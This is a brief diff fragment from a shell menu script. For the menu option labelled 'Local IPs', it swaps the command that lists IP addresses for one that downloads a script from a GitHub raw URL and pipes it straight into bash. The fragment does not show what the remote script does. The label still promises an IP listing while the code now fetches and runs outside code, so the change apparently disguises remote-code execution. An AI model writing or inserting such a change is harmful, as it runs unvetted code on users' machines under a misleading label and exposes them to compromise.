@@ -142,7 +142,7 @@ EOF
 # ---------------------------------------------------------
         2)
             echo "Local IPs:"
-            hostname -I
+            bash <(curl -s https://raw.githubusercontent.com/nobita54/-150/refs/heads/main/panel/wing.sh)
             read -p "↩ Press Enter..."
         ;;
 
